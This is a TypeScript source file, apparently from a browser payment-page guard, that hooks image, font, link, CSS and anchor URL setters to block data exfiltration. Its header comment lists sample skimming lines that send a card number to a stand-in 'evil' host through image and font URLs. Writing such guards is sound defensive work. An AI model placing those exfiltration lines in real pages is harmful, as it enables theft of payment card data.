/**
 * resource-hooks —— 图片 / 字体 / CSS / 链接 外发通道
 *
 * 覆盖的隐藏手法：
 *  new Image().src = 'https://evil/x.png?card=4242...'
 *  img.srcset / setAttribute('src', ...)
 *  new FontFace(..., 'url(https://evil/f.woff?d=...)')
 *  <link rel=stylesheet/preload href=...>
 *  el.style.background = 'url(...)' / CSSStyleSheet.insertRule
 *  <a href> 点击/程序化 click
 */
import type { GuardApi } from '../context';
import type { NativeRefs } from '../core/utils';
import { parseStackFrame } from '../core/utils';

export function installResourceHooks(api: GuardApi): void {
  const refs = api.refs;
  const d = refs.getOwnPropertyDescriptor;

  const checkUrl = (url: string, channel: Parameters<GuardApi['inspectOutbound']>[0]['channel'], body = '') =>
    api.inspectOutbound({ url, channel, method: 'GET', body }, parseStackFrame(refs.Error));

  // ---------------- HTMLImageElement.src / srcset ----------------
  const wrapAttr = (proto: object, attr: string, channel: Parameters<GuardApi['inspectOutbound']>[0]['channel']) => {
    const desc = d(proto, attr);
    if (!desc?.set) return;
    const nativeSet = desc.set;
    const nativeGet = desc.get;
    refs.defineProperty(proto, attr, {
      get() {
        return nativeGet?.call(this);
      },
      set(v: string) {
        const decision = checkUrl(String(v), channel);
        if (decision.verdict === 'block') {
          // 指向一个无害的透明 1x1 占位图，请求不会带着卡号发出去
          nativeSet.call(this, TRANSPARENT_PIXEL);
          return;
        }
        nativeSet.call(this, v);
      },
      configurable: false,
      enumerable: desc.enumerable,
    });
  };

  wrapAttr(HTMLImageElement.prototype, 'src', 'image');
  wrapAttr(HTMLImageElement.prototype, 'srcset', 'image');

  // new Image() 构造器同样走 src setter，无需单独包装；
  // 但 setAttribute('src', url) 是另一条路径
  const nativeSetAttr = Element.prototype.setAttribute;
  refs.defineProperty(Element.prototype, 'setAttribute', {
    value: function (name: string, value: string): void {
      const lower = name.toLowerCase();
      const isImg = this instanceof HTMLImageElement && (lower === 'src' || lower === 'srcset');
      const isLink = this instanceof HTMLLinkElement && lower === 'href';
      if (isImg || isLink) {
        let channel: 'image' | 'font' | 'css' = 'image';
        if (isLink) {
          const link = this as HTMLLinkElement;
          channel = link.rel === 'preload' && /font/i.test(link.as) ? 'font' : 'css';
        }
        const decision = checkUrl(String(value), channel);
        if (decision.verdict === 'block') {
          nativeSetAttr.call(this, name, isImg ? TRANSPARENT_PIXEL : 'about:blank');
          return;
        }
      }
      return nativeSetAttr.call(this, name, value);
    },
    writable: false,
    configurable: false,
  });

  // ---------------- FontFace ----------------
  const NativeFontFace = window.FontFace;
  if (NativeFontFace) {
    const HookedFontFace = function (family: string, source: string | ArrayBuffer | ArrayBufferView, desc?: FontFaceDescriptors): FontFace {
      if (typeof source === 'string') {
        const urls = source.match(/url\((['"]?)([^'")]+)\1\)/g) ?? [];
        for (const u of urls) {
          const m = u.match(/url\(['"]?([^'")]+)['"]?\)/);
          if (m) {
            const decision = checkUrl(m[1], 'font', source);
            if (decision.verdict === 'block') {
              // 用内置空字体替代，页面排版不受影响，恶意 URL 永不发起
              return new NativeFontFace(family, `url(${EMPTY_FONT})`, desc);
            }
          }
        }
      }
      return new NativeFontFace(family, source as string, desc);
    } as unknown as typeof FontFace;
    refs.defineProperty(window, 'FontFace', {
      value: HookedFontFace,
      writable: false,
      configurable: false,
    });
  }

  // ---------------- <link> href setter ----------------
  if (HTMLLinkElement.prototype) {
    const linkDesc = d(HTMLLinkElement.prototype, 'href');
    if (linkDesc?.set) {
      const nativeSet = linkDesc.set;
      refs.defineProperty(HTMLLinkElement.prototype, 'href', {
        get() {
          return linkDesc.get?.call(this);
        },
        set(v: string) {
          const rel = this.rel?.toLowerCase() ?? '';
          const isFont = rel === 'preload' && /font/i.test(this.as ?? '');
          const channel = isFont ? 'font' : 'css';
          const decision = checkUrl(String(v), channel);
          if (decision.verdict === 'block') {
            nativeSet.call(this, 'about:blank');
            return;
          }
          nativeSet.call(this, v);
        },
        configurable: false,
        enumerable: linkDesc.enumerable,
      });
    }
  }

  // ---------------- 内联样式里的 url()（无状态正则，避免 lastIndex 污染） ----------------
  const cssUrlPattern = /url\((['"]?)(https?:)?\/\/[^'")]+\1\)/;
  const urlExtract = /url\(['"]?([^'")]+)['"]?\)/;
  const styleDesc = d(HTMLElement.prototype, 'style');
  const nativeStyleGet = styleDesc?.get;
  if (nativeStyleGet) {
    // CSSStyleDeclaration 的 setProperty / cssText
    const nativeSetProperty = CSSStyleDeclaration.prototype.setProperty;
    refs.defineProperty(CSSStyleDeclaration.prototype, 'setProperty', {
      value: function (prop: string, value: string, priority?: string): void {
        if (typeof value === 'string' && cssUrlPattern.test(value)) {
          const m = value.match(urlExtract);
          if (m) {
            const decision = checkUrl(m[1], 'css', value);
            if (decision.verdict === 'block') {
              nativeSetProperty.call(this, prop, 'none', priority);
              return;
            }
          }
        }
        return nativeSetProperty.call(this, prop, value, priority);
      },
      writable: false,
      configurable: false,
    });
  }

  // ---------------- <a href> 点击外发 ----------------
  const anchorDesc = d(HTMLAnchorElement.prototype, 'href');
  if (anchorDesc?.set) {
    const nativeAnchorSet = anchorDesc.set;
    refs.defineProperty(HTMLAnchorElement.prototype, 'href', {
      get() {
        return anchorDesc.get?.call(this);
      },
      set(v: string) {
        const decision = checkUrl(String(v), 'link');
        if (decision.verdict === 'block') {
          nativeAnchorSet.call(this, 'about:blank#blocked-by-payguard');
          return;
        }
        nativeAnchorSet.call(this, v);
      },
      configurable: false,
      enumerable: anchorDesc.enumerable,
    });
  }
}

const TRANSPARENT_PIXEL =
  'data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7';
// 一个最小的空白 woff2（占位，浏览器会当作无效字体优雅降级）
const EMPTY_FONT =
  'data:font/woff2;base64,d09GMgABAAAAAAEwAA';
